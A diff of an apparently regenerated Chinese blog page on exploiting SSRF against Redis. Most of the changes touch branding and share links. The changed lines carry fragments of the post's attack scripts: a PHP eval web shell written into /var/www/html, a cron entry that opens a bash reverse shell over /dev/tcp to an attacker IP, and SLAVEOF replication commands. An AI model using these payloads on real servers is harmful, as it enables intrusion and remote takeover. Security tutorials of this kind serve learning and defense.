@@ -14,7 +14,7 @@
     
     
     
-    <title>浅析Redis中SSRF的利用 | 七友&#39;s Blog | 七友</title>
+    <title>浅析Redis中SSRF的利用 | 七友 | 路漫漫其修远兮，吾将上下而求索</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
     <meta name="theme-color" content="#3F51B5">
@@ -26,7 +26,7 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="浅析Redis中SSRF的利用">
 <meta property="og:url" content="https://byqiyou.github.io/2019/07/15/浅析Redis中SSRF的利用/index.html">
-<meta property="og:site_name" content="七友&#39;s Blog">
+<meta property="og:site_name" content="七友">
 <meta property="og:description" content="SSRF介绍SSRF，服务器端请求伪造，服务器请求伪造，是由攻击者构造的漏洞，用于形成服务器发起的请求。通常，SSRF攻击的目标是外部网络无法访问的内部系统。这里我们要介绍的是关于redis中SSRF的利用，如果有什么错误的地方还请师傅们不吝赐教/握拳。 前置知识文章中的数据包构造会涉及到redis的RESP协议，所以我们这里先科普一下，了解RESP协议的师傅可以跳过=。= RESP协议Redis">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190713085931-794d2d5e-a509-1.png">
@@ -121,14 +121,7 @@
             </li>
         
             <li class="waves-block waves-effect">
-              <a href="http://www.weibo.com/ysweb" target="_blank" >
-                <i class="icon icon-lg icon-weibo"></i>
-                Weibo
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="/custom"  >
+              <a href="/friends"  >
                 <i class="icon icon-lg icon-link"></i>
                 测试
               </a>
@@ -226,11 +219,11 @@
 <p>我们用<code>tcpdump</code>来抓个包来测试一下</p>
 <pre><code>tcpdump port 6379 -w ./Desktop/1.pcap
 </code></pre><p>redis客户端中执行如下命令</p>
-<pre class=" language-sh"><code class="language-sh">192.168.163.128:6379&gt; set name test
+<pre class=" language-sh"><code class="language-sh">192.168.163.128:6379> set name test
 OK
-192.168.163.128:6379&gt; get name
+192.168.163.128:6379> get name
 "test"
-192.168.163.128:6379&gt;
+192.168.163.128:6379>
 
 </code></pre>
 <p>抓到的数据包如下</p>
@@ -274,7 +267,7 @@ save
 protocol<span class="token operator">=</span><span class="token string">"gopher://"</span>
 ip<span class="token operator">=</span><span class="token string">"192.168.163.128"</span>
 port<span class="token operator">=</span><span class="token string">"6379"</span>
-shell<span class="token operator">=</span><span class="token string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?&gt;\n\n"</span>
+shell<span class="token operator">=</span><span class="token string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?>\n\n"</span>
 filename<span class="token operator">=</span><span class="token string">"shell.php"</span>
 path<span class="token operator">=</span><span class="token string">"/var/www/html"</span>
 passwd<span class="token operator">=</span><span class="token string">""</span>
@@ -379,7 +372,7 @@ save
 </code></pre><p>转化为redis RESP协议的格式<br><strong>PS：将第一个脚本改一下</strong></p>
 <pre class=" language-python"><code class="language-python">reverse_ip<span class="token operator">=</span><span class="token string">"192.168.163.132"</span>
 reverse_port<span class="token operator">=</span><span class="token string">"2333"</span>
-cron<span class="token operator">=</span><span class="token string">"\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n"</span><span class="token operator">%</span><span class="token punctuation">(</span>reverse_ip<span class="token punctuation">,</span>reverse_port<span class="token punctuation">)</span>
+cron<span class="token operator">=</span><span class="token string">"\n\n\n\n*/1 * * * * bash -i >&amp; /dev/tcp/%s/%s 0>&amp;1\n\n\n\n"</span><span class="token operator">%</span><span class="token punctuation">(</span>reverse_ip<span class="token punctuation">,</span>reverse_port<span class="token punctuation">)</span>
 filename<span class="token operator">=</span><span class="token string">"root"</span>
 path<span class="token operator">=</span><span class="token string">"/var/spool/cron"</span>
 </code></pre>
@@ -427,21 +420,21 @@ redis-server /etc/redis/redis6380.conf
 </code></pre>
 <p>我们把master_ip设置为<code>127.0.0.1</code>，master_port为<code>6380</code></p>
 <pre class=" language-sh"><code class="language-sh">root@kali:/usr/bin# redis-cli -p 6379
-127.0.0.1:6379&gt; SLAVEOF 127.0.0.1 6380
+127.0.0.1:6379> SLAVEOF 127.0.0.1 6380
 OK
-127.0.0.1:6379&gt; get test
+127.0.0.1:6379> get test
 (nil)
-127.0.0.1:6379&gt; exit
+127.0.0.1:6379> exit
 root@kali:/usr/bin# redis-cli -p 6380
-127.0.0.1:6380&gt; get test
+127.0.0.1:6380> get test
 (nil)
-127.0.0.1:6380&gt; set test "test"
+127.0.0.1:6380> set test "test"
 OK
-127.0.0.1:6380&gt; get test
+127.0.0.1:6380> get test
 "test"
-127.0.0.1:6380&gt; exit
+127.0.0.1:6380> exit
 root@kali:/usr/bin# redis-cli -p 6379
-127.0.0.1:6379&gt; get test
+127.0.0.1:6379> get test
 "test"
 </code></pre>
 <p>执行一波，我们可以明显看到数据达到了同步的效果.<br>如果我们想解除主从关系可以执行<code>SLAVEOF NO ONE</code></p>
@@ -679,7 +672,7 @@ exp_filename<span class="token operator">=</span><span class="token string">"exp
 
 
         
-        这里可以写作者留言，标签和 hexo 中所有变量及辅助函数等均可调用，示例：<a href="/2019/07/15/浅析Redis中SSRF的利用/" target="_blank" rel="external">https://byqiyou.github.io/2019/07/15/浅析Redis中SSRF的利用/</a>
+        know it then hack it
         
     </div>
     
@@ -710,7 +703,7 @@ exp_filename<span class="token operator">=</span><span class="token string">"exp
 <div class="page-share" id="pageShare">
     <ul class="reset share-icons">
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2019/07/15/浅析Redis中SSRF的利用/&title=《浅析Redis中SSRF的利用》 — 七友's Blog&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2019/07/15/浅析Redis中SSRF的利用/&title=《浅析Redis中SSRF的利用》 — 七友&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -720,7 +713,7 @@ exp_filename<span class="token operator">=</span><span class="token string">"exp
         </a>
       </li>
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2019/07/15/浅析Redis中SSRF的利用/&title=《浅析Redis中SSRF的利用》 — 七友's Blog&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2019/07/15/浅析Redis中SSRF的利用/&title=《浅析Redis中SSRF的利用》 — 七友&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
@@ -730,7 +723,7 @@ exp_filename<span class="token operator">=</span><span class="token string">"exp
         </a>
       </li>
       <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《浅析Redis中SSRF的利用》 — 七友's Blog&url=https://byqiyou.github.io/2019/07/15/浅析Redis中SSRF的利用/&via=https://byqiyou.github.io" data-title=" Twitter">
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《浅析Redis中SSRF的利用》 — 七友&url=https://byqiyou.github.io/2019/07/15/浅析Redis中SSRF的利用/&via=https://byqiyou.github.io" data-title=" Twitter">
           <i class="icon icon-twitter"></i>
         </a>
       </li>
@@ -876,7 +869,7 @@ exp_filename<span class="token operator">=</span><span class="token string">"exp
 <div class="global-share" id="globalShare">
     <ul class="reset share-icons">
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2019/07/15/浅析Redis中SSRF的利用/&title=《浅析Redis中SSRF的利用》 — 七友's Blog&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2019/07/15/浅析Redis中SSRF的利用/&title=《浅析Redis中SSRF的利用》 — 七友&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -886,7 +879,7 @@ exp_filename<span class="token operator">=</span><span class="token string">"exp
         </a>
       </li>
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2019/07/15/浅析Redis中SSRF的利用/&title=《浅析Redis中SSRF的利用》 — 七友's Blog&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2019/07/15/浅析Redis中SSRF的利用/&title=《浅析Redis中SSRF的利用》 — 七友&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
@@ -896,7 +889,7 @@ exp_filename<span class="token operator">=</span><span class="token string">"exp
         </a>
       </li>
       <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《浅析Redis中SSRF的利用》 — 七友's Blog&url=https://byqiyou.github.io/2019/07/15/浅析Redis中SSRF的利用/&via=https://byqiyou.github.io" data-title=" Twitter">
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《浅析Redis中SSRF的利用》 — 七友&url=https://byqiyou.github.io/2019/07/15/浅析Redis中SSRF的利用/&via=https://byqiyou.github.io" data-title=" Twitter">
           <i class="icon icon-twitter"></i>
         </a>
       </li>
